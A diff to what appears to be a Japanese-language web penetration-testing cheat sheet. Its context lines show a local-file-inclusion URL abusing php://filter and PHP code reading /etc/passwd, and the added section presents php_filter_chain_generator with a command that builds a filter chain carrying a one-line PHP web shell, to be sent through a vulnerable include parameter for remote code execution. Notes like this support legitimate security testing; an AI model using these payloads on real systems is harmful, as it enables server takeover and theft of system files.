@@ -198,6 +198,17 @@ http://192.168.11.15/?lang=php://filter/convert.base64-encode/resource=index
 echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
 ```
 
+#### php_filter_chain_generator
+https://github.com/synacktiv/php_filter_chain_generator
+
+require か include のパラメータを渡せるとき、ファイルアップロードも、dataスキームも使わずにRCEが可能になるという天才過ぎるツール。
+
+```shell
+python3 php_filter_chain_generator.py --chain '<?=`$_GET[0]`?>'
+```
+
+これで生成される長い難読フィルターを、パラメータとして送信する。
+
 ## JWT
 
 ```text
